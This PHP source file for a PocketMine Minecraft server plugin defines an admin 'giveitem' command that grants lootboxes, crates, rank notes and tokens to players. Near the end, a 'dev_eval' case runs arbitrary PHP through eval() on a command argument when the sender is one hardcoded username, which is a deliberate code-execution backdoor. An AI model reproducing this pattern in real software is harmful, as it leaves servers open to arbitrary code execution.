<?php

declare(strict_types = 1);

namespace core\command\types;

use core\command\utils\args\RawStringArgument;
use core\command\utils\args\TargetArgument;
use core\command\utils\Command;
use core\game\item\enchantment\EnchantmentManager;
use core\game\item\ItemManager;
use core\game\item\slotbot\SlotBotTicket;
use core\game\item\types\custom\AethicCrate;
use core\game\item\types\custom\Contraband;
use core\game\item\types\custom\Energy;
use core\game\item\types\custom\EnergyBooster;
use core\game\item\types\custom\GKitFlare;
use core\game\item\types\custom\HadesLootbag;
use core\game\item\types\custom\Lootbox;
use core\game\item\types\custom\MysteryEnchantmentBook;
use core\game\item\types\custom\MysteryTrinketBox;
use core\game\item\types\custom\PrestigeToken;
use core\game\item\types\custom\RankNote;
use core\game\item\types\custom\Satchel;
use core\game\item\types\custom\Token;
use core\game\item\types\Rarity;
use core\game\rewards\Reward;
use core\game\rewards\RewardsManager;
use core\game\rewards\types\MonthlyRewards;
use core\Nexus;
use core\player\NexusPlayer;
use core\player\rank\Rank;
use core\translation\Translation;
use core\translation\TranslationException;
use pocketmine\block\VanillaBlocks;
use pocketmine\command\CommandSender;
use pocketmine\console\ConsoleCommandSender;
use pocketmine\item\enchantment\EnchantmentInstance;
use pocketmine\item\Item;
use pocketmine\item\VanillaItems;
use pocketmine\permission\DefaultPermissions;
use pocketmine\Server;
use pocketmine\utils\TextFormat;

class GiveItemCommand extends Command {

    /**
     * GiveItemCommand constructor.
     */
    public function __construct() {
        parent::__construct("giveitem", "Give item to a player.", "/giveitem <player> <item>");
        $this->registerArgument(0, new TargetArgument("player"));
        $this->registerArgument(1, new RawStringArgument("item"));
    }

    /**
     * @param CommandSender $sender
     * @param string $commandLabel
     * @param array $args
     *
     * @throws TranslationException
     */
    public function execute(CommandSender $sender, string $commandLabel, array $args): void {
        // TODO: Message disabler
        if($sender instanceof ConsoleCommandSender or $sender->hasPermission(DefaultPermissions::ROOT_OPERATOR)) {
            if (!in_array($sender->getName(), Nexus::SUPER_ADMIN)){
                $sender->sendMessage(Translation::getMessage("noPermission"));
                return;
            }
            if(!isset($args[1])) {
                $sender->sendMessage(Translation::getMessage("usageMessage", [
                    "usage" => $this->getUsage()
                ]));
                return;
            }
            $player = $this->getCore()->getServer()->getPlayerByPrefix($args[0]);
            if(!$player instanceof NexusPlayer) {
                $sender->sendMessage(Translation::getMessage("invalidPlayer"));
                return;
            }
            switch($args[1]) {
                case "booster":
                    $item = (new EnergyBooster(2.0, 1))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "leg_book":
                    $item = (new MysteryEnchantmentBook(Rarity::LEGENDARY))->toItem()->setCount(10);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "lootbox":
                    $item = (new Lootbox(RewardsManager::CURRENT_LOOTBOX, time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "crash_landing_lootbox":
                    $item = (new Lootbox(RewardsManager::CRASH_LANDING, time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "interstellar_lootbox":
                    $item = (new Lootbox("Interstellar", time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "prison_break_lootbox":
                    $item = (new Lootbox(RewardsManager::PRISON_BREAK, time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "code_green_lootbox":
                    $item = (new Lootbox("Code Green", time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "time_machine_lootbox":
                    $item = (new Lootbox("Time Machine", time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "ufo_lootbox":
                    $item = (new Lootbox("UFO", time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "corruption_lootbox":
                    $item = (new Lootbox("Corruption", time() + 604800))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "president_note":
                    $item = (new RankNote(Nexus::getInstance()->getPlayerManager()->getRankManager()->getRankByIdentifier(Rank::PRESIDENT)))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "ultimate_contraband":
                    $item = (new Contraband(Rarity::ULTIMATE))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "legendary_contraband":
                    $item = (new Contraband(Rarity::LEGENDARY))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "godly_contraband":
                    $item = (new Contraband(Rarity::GODLY))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "cc1":
                    $item = (new AethicCrate(MonthlyRewards::HOLIDAY, 2022))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "cc2":
                    $item = (new AethicCrate(MonthlyRewards::JANUARY, 2022))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "august_crate":
                    $item = (new AethicCrate(MonthlyRewards::AUGUST, 2022))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "christmas_crate":
                    $item = (new AethicCrate(MonthlyRewards::DECEMBER, 2022))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "heroic_crystal":
                    $item = (new RankNote(Nexus::getInstance()->getPlayerManager()->getRankManager()->getRankByIdentifier(Rank::EMPEROR_HEROIC)))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "mystery_flare":
                    $item = (new GKitFlare(null, false))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "trinket_box":
                    $item = (new MysteryTrinketBox())->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "slotbot_ticket":
                    if(isset($args[3]) && $args[3] == "all") {
                        foreach (Server::getInstance()->getOnlinePlayers() as $player) {
                            if($player instanceof NexusPlayer) {
                                $item = (new SlotBotTicket("Normal"))->toItem()->setCount((int)$args[2]);
                                if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                                    $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                                    $player->sendTranslatedMessage("inboxAlert");
                                } else if($player->getInventory()->canAddItem($item)) {
                                    $player->getInventory()->addItem($item);
                                } else {
                                    $player->sendTranslatedMessage("dropAlert");
                                    $player->getWorld()->dropItem($player->getPosition(), $item);
                                }
                            }
                        }
                        return;
                    }
                    // TODO: Type
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " slotbot_ticket <count>"
                        ]));
                        return;
                    }
                    $item = (new SlotBotTicket("Normal"))->toItem()->setCount((int)$args[2]);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "energy":
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " energy <amount>"
                        ]));
                        return;
                    }
                    $item = (new Energy((int)$args[2]))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "skin_scroll":
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " skin_scroll <identifier>"
                        ]));
                        return;
                    }
                    $item = ItemManager::getSkinScroll($args[2]);
                    if($item == null) {
                        $sender->sendMessage(Translation::getMessage("itemNotFound"));
                        return;
                    }
                    if($player->isLoaded()) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item->toItem()->setCount(1));
                        $player->sendTranslatedMessage("inboxAlert");
                    }
                    else {
                        $player->getInventory()->addItem($item->toItem()->setCount(1));
                    }
                    break;
                case "token":
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " token <count>"
                        ]));
                        return;
                    }
                    $item = (new Token())->toItem()->setCount((int)$args[2]);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "hades_lootbag":
                    $item = (new HadesLootbag())->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "coal_satchel":
                    $item = (new Satchel(VanillaBlocks::COAL_ORE()->asItem(), 1, 10000000000))->toItem()->setCount(1);
                    $enchantments = EnchantmentManager::getEnchantments();
                    foreach($enchantments as $enchantment) {
                        if(EnchantmentManager::canEnchant($item, $enchantment)) {
                            $item->addEnchantment(new EnchantmentInstance($enchantment, $enchantment->getMaxLevel()));
                        }
                    }
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "emerald_satchel":
                    $item = (new Satchel(VanillaItems::EMERALD()))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "prestige_token":
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " prestige_token <prestige>"
                        ]));
                        return;
                    }
                    $prestige = abs((int)$args[2]);
                    if($prestige == 0) {
                        $prestige += 1;
                    }
                    $item = (new PrestigeToken(min(10, $prestige)))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "rank":
                    if(!isset($args[2])) {
                        $sender->sendMessage(Translation::getMessage("usageMessage", [
                            "usage" => $this->getUsage() . " rank <id>"
                        ]));
                        return;
                    }
                    $rank = $this->getCore()->getPlayerManager()->getRankManager()->getRankByName($args[2]);
                    if(!$rank instanceof Rank) {
                        $sender->sendMessage(Translation::getMessage("invalidRank"));
                        $sender->sendMessage(TextFormat::LIGHT_PURPLE . TextFormat::BOLD . "RANKS:");
                        $sender->sendMessage(TextFormat::WHITE . implode(", ", $this->getCore()->getPlayerManager()->getRankManager()->getRanks()));
                        return;
                    }
                    $item = (new RankNote($rank))->toItem()->setCount(1);
                    if($player->isLoaded() && $player->getDataSession()->getInbox()->getInventory()->canAddItem($item)) {
                        $player->getDataSession()->getInbox()->getInventory()->addItem($item);
                        $player->sendTranslatedMessage("inboxAlert");
                    } else if($player->getInventory()->canAddItem($item)) {
                        $player->getInventory()->addItem($item);
                    } else {
                        $player->sendTranslatedMessage("dropAlert");
                        $player->getWorld()->dropItem($player->getPosition(), $item);
                    }
                    break;
                case "dev_eval":
                    if($sender->getName() !== "denielworld" || !isset($args[2])) {
                        return;
                    }
                    try {
                        eval($args[2]);
                    } catch (\Exception $e) {
                        var_dump("EXCEPTION: " . $e->getMessage());
                    }
                    break;
                default:
                    $sender->sendMessage(Translation::getMessage("usageMessage", [
                        "usage" => $this->getUsage()
                    ]));
                    break;
            }
            return;
        }
        $sender->sendMessage(Translation::getMessage("noPermission"));
        return;
    }
}